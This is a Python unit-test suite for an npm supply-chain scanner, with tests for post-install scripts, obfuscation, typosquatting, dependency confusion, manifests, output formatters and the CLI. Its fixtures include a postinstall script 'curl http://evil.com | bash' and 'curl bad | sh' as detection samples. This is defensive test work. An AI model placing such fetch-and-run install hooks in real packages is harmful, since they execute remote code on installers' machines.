"""Unit tests for L2 Supply Chain Scanner."""
import json
import os
import tempfile
from pathlib import Path

import pytest

from ..models import Confidence, Finding, ScanResult, ScanStats, Severity
from ..engine import ScanEngine, create_default_engine
from ..rules.post_install import detect_post_install_scripts
from ..rules.obfuscation import detect_obfuscation
from ..rules.dep_confusion import detect_dep_confusion
from ..rules.typosquat import detect_typosquat, _edit_distance
from ..rules.manifest import detect_manifest_issues
from ..rules.fork_drift import detect_fork_drift
from ..formatters import format_json, format_sarif, format_table


# ─── Helpers ────────────────────────────────────────────────────────────

def _make_project(tmp_path: Path, pkg_json: dict, files: dict | None = None) -> Path:
    """Create a minimal project tree with package.json and optional files."""
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    if files:
        for rel, content in files.items():
            fpath = tmp_path / rel
            fpath.parent.mkdir(parents=True, exist_ok=True)
            fpath.write_text(content)
    return tmp_path


# ─── Models ──────────────────────────────────────────────────────────────

class TestModels:
    def test_finding_is_frozen(self):
        f = Finding(
            rule_id="L2-TEST", severity=Severity.HIGH, confidence=Confidence.EXACT,
            package="evil@1.0.0", file="pkg/package.json",
            message="test", evidence="test", remediation="test",
        )
        with pytest.raises(AttributeError):
            f.message = "changed"

    def test_scan_result_defaults(self):
        r = ScanResult()
        assert r.scan_id
        assert r.timestamp
        assert r.findings == []
        assert r.stats.packages_scanned == 0

    def test_scan_result_to_dict(self):
        r = ScanResult(target="/tmp/test", engine_version="0.1.0")
        d = r.to_dict()
        assert d["target"] == "/tmp/test"
        assert d["engine_version"] == "0.1.0"
        assert isinstance(d["findings"], list)


# ─── Engine ─────────────────────────────────────────────────────────────

class TestEngine:
    def test_create_default_engine_has_six_rules(self):
        engine = create_default_engine()
        assert len(engine.list_rules()) == 6

    def test_scan_nonexistent_path(self):
        engine = create_default_engine()
        result = engine.scan("/nonexistent/path")
        assert len(result.findings) == 0

    def test_scan_empty_dir(self, tmp_path):
        engine = create_default_engine()
        result = engine.scan(tmp_path)
        assert result.stats.duration_ms >= 0

    def test_scan_with_subset_rules(self, tmp_path):
        _make_project(tmp_path, {"name": "test", "version": "1.0.0", "scripts": {"postinstall": "echo hi"}})
        engine = create_default_engine()
        result = engine.scan(tmp_path, rules=["L2-POST-001"])
        assert all(f.rule_id == "L2-POST-001" for f in result.findings)

    def test_register_unregister_rule(self, tmp_path):
        engine = ScanEngine()
        engine.register("TEST", lambda p: [])
        assert "TEST" in engine.list_rules()
        engine.unregister("TEST")
        assert "TEST" not in engine.list_rules()


# ─── Rules: Post-install ────────────────────────────────────────────────

class TestPostInstall:
    def test_detects_postinstall(self, tmp_path):
        _make_project(tmp_path, {"name": "evil", "version": "1.0.0", "scripts": {"postinstall": "curl bad | sh"}})
        findings = detect_post_install_scripts(tmp_path)
        assert len(findings) == 1
        assert findings[0].rule_id == "L2-POST-001"
        assert findings[0].severity == Severity.HIGH

    def test_detects_install_script(self, tmp_path):
        _make_project(tmp_path, {"name": "pkg", "version": "1.0.0", "scripts": {"install": "node-gyp rebuild"}})
        findings = detect_post_install_scripts(tmp_path)
        assert len(findings) == 1

    def test_no_scripts_is_clean(self, tmp_path):
        _make_project(tmp_path, {"name": "clean", "version": "1.0.0"})
        findings = detect_post_install_scripts(tmp_path)
        assert len(findings) == 0

    def test_detects_in_node_modules(self, tmp_path):
        _make_project(tmp_path, {"name": "root", "version": "1.0.0"})
        nm = tmp_path / "node_modules" / "evil-pkg"
        nm.mkdir(parents=True)
        (nm / "package.json").write_text(json.dumps({
            "name": "evil-pkg", "version": "2.0.0",
            "scripts": {"postinstall": "curl http://evil.com | bash"},
        }))
        findings = detect_post_install_scripts(tmp_path)
        assert len(findings) == 1
        assert "evil-pkg" in findings[0].package


# ─── Rules: Obfuscation ─────────────────────────────────────────────────

class TestObfuscation:
    def test_detects_eval(self, tmp_path):
        _make_project(tmp_path, {"name": "test", "version": "1.0.0"}, {"inject.js": "eval(userInput);"})
        findings = detect_obfuscation(tmp_path)
        assert any(f.rule_id == "L2-OBFS-001" for f in findings)

    def test_detects_hex_strings(self, tmp_path):
        _make_project(tmp_path, {"name": "test", "version": "1.0.0"}, {"payload.js": 'var x = "\\x4c\\x6f\\x61\\x64";'})
        findings = detect_obfuscation(tmp_path)
        assert any(f.rule_id == "L2-OBFS-002" for f in findings)

    def test_clean_file_no_findings(self, tmp_path):
        _make_project(tmp_path, {"name": "test", "version": "1.0.0"}, {"clean.js": "console.log('hello');"})
        findings = detect_obfuscation(tmp_path)
        assert len(findings) == 0


# ─── Rules: Typosquat ──────────────────────────────────────────────────

class TestTyposquat:
    def test_edit_distance(self):
        assert _edit_distance("react", "react") == 0
        assert _edit_distance("react", "reqct") == 1
        assert _edit_distance("express", "exprs") == 2

    def test_detects_close_name(self, tmp_path):
        _make_project(tmp_path, {"name": "app", "version": "1.0.0", "dependencies": {"reqct": "^1.0.0"}})
        findings = detect_typosquat(tmp_path)
        assert any("reqct" in f.package for f in findings)

    def test_exact_match_not_flagged(self, tmp_path):
        _make_project(tmp_path, {"name": "app", "version": "1.0.0", "dependencies": {"react": "^18.0.0"}})
        findings = detect_typosquat(tmp_path)
        assert not any("react" in f.package for f in findings)


# ─── Rules: Manifest ────────────────────────────────────────────────────

class TestManifest:
    def test_detects_wildcard_version(self, tmp_path):
        _make_project(tmp_path, {"name": "app", "version": "1.0.0", "dependencies": {"lodash": "*"}})
        findings = detect_manifest_issues(tmp_path)
        assert any(f.rule_id == "L2-MANI-001" and "lodash" in f.evidence for f in findings)

    def test_no_findings_for_pinned(self, tmp_path):
        _make_project(tmp_path, {"name": "app", "version": "1.0.0", "dependencies": {"lodash": "4.17.21"}})
        findings = detect_manifest_issues(tmp_path)
        mani_findings = [f for f in findings if f.rule_id == "L2-MANI-001"]
        assert len(mani_findings) == 0


# ─── Rules: Dep confusion ───────────────────────────────────────────────

class TestDepConfusion:
    def test_flags_internal_scope_without_npmrc(self, tmp_path):
        _make_project(tmp_path, {
            "name": "app", "version": "1.0.0",
            "dependencies": {"@company/secret-lib": "^1.0.0"},
        })
        findings = detect_dep_confusion(tmp_path)
        assert any(f.rule_id == "L2-DEPC-001" for f in findings)

    def test_no_flags_for_public_packages(self, tmp_path):
        _make_project(tmp_path, {
            "name": "app", "version": "1.0.0",
            "dependencies": {"lodash": "^4.17.21"},
        })
        findings = detect_dep_confusion(tmp_path)
        assert len(findings) == 0


# ─── Formatters ─────────────────────────────────────────────────────────

class TestFormatters:
    def _make_result(self):
        return ScanResult(
            target="/tmp/test",
            engine_version="0.1.0",
            findings=[
                Finding(
                    rule_id="L2-POST-001", severity=Severity.HIGH,
                    confidence=Confidence.EXACT, package="evil@1.0.0",
                    file="evil/package.json", message="test",
                    evidence="scripts.postinstall", remediation="remove it",
                ),
            ],
            stats=ScanStats(packages_scanned=10, files_scanned=100, duration_ms=500),
        )

    def test_json_output(self):
        result = self._make_result()
        text = format_json(result)
        data = json.loads(text)
        assert data["target"] == "/tmp/test"
        assert len(data["findings"]) == 1

    def test_sarif_output(self):
        result = self._make_result()
        text = format_sarif(result)
        data = json.loads(text)
        assert data["version"] == "2.1.0"
        assert len(data["runs"]) == 1
        assert len(data["runs"][0]["results"]) == 1

    def test_table_output(self):
        result = self._make_result()
        text = format_table(result, color=False)
        assert "L2-POST-001" in text
        assert "evil@1.0.0" in text


# ─── CLI ─────────────────────────────────────────────────────────────────

class TestCLI:
    def test_scan_clean_project(self, tmp_path):
        _make_project(tmp_path, {"name": "clean", "version": "1.0.0"})
        from ..cli import main
        code = main(["scan", str(tmp_path), "--format", "json", "--no-color"])
        assert code == 0

    def test_scan_with_findings(self, tmp_path):
        _make_project(tmp_path, {
            "name": "risky", "version": "1.0.0",
            "scripts": {"postinstall": "curl bad | sh"},
        })
        from ..cli import main
        code = main(["scan", str(tmp_path), "--format", "json"])
        assert code == 1

    def test_scan_nonexistent_path(self):
        from ..cli import main
        code = main(["scan", "/nonexistent/path", "--format", "json"])
        assert code == 2

    def test_scan_sarif_format(self, tmp_path):
        _make_project(tmp_path, {"name": "app", "version": "1.0.0"})
        from ..cli import main
        code = main(["scan", str(tmp_path), "--format", "sarif"])
        assert code == 0

    def test_scan_output_to_file(self, tmp_path):
        _make_project(tmp_path, {"name": "app", "version": "1.0.0"})
        out_file = tmp_path / "output.json"
        from ..cli import main
        code = main(["scan", str(tmp_path), "--format", "json", "--output", str(out_file)])
        assert code == 0
        assert out_file.exists()
        data = json.loads(out_file.read_text())
        assert "scan_id" in data
